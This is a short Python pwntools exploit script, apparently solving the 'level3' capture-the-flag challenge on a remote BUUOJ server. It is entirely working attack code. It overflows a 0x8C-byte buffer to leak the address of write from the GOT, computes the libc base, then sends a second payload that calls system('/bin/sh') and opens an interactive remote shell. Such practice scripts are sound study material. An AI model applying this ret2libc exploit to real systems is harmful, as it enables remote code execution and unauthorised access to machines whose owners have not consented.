from pwn import *

context.log_level = "debug"

exe = ELF("./level3")
# libc = exe.libc
# r = exe.process()
libc = ELF("./libc-2.23.so")
r = remote("node4.buuoj.cn", 28435)

r.recvuntil(b"Input:\n")
r.send(
    cyclic(0x8C)
    + p32(exe.plt["write"])
    + p32(exe.sym["main"])
    + p32(1)
    + p32(exe.got["write"])
    + p32(4)
)
libc_write = u32(r.recv(4))
libc_base = libc_write - libc.sym["write"]
libc_system = libc_base + libc.sym["system"]
libc_bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))
r.recvuntil(b"Input:\n")
r.send(cyclic(0x8C) + p32(libc_system) + p32(0) + p32(libc_bin_sh))
r.interactive()